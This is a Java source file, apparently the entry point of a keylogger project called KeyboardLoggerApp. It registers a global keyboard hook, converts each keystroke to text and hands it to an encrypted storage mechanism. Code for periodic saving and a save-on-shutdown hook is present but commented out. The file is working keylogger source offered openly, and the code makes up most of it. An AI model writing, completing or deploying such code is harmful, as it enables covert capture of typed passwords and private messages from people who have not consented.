package com.keytracker;


import com.keytracker.encrypt.KeyGen;
import de.ksquared.system.keyboard.GlobalKeyListener;

public class KeyboardLoggerApp {
    public static void main(String[] args) {
        KeyAppender keyAppender = new KeyAppender();

        MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(new ArgsResolver(args), new KeyGen());    //todo
        StoreMechanism storeMechanism = mechanismsFactory.getStoreMechanism();
        storeMechanism.registerAppender(keyAppender);

        KeyListenerImpl keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new CharactersProvider()), keyAppender);
        new GlobalKeyListener().addKeyListener(keyListener);

//        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(storeMechanism::store, 10, 10, TimeUnit.SECONDS);
//        shutdownHook(storeMechanism);
    }

    private static void shutdownHook(StoreMechanism fileStoreMechanism) {
        Runtime.getRuntime().addShutdownHook(new Thread(fileStoreMechanism::store, "Shutdown-thread"));
    }
}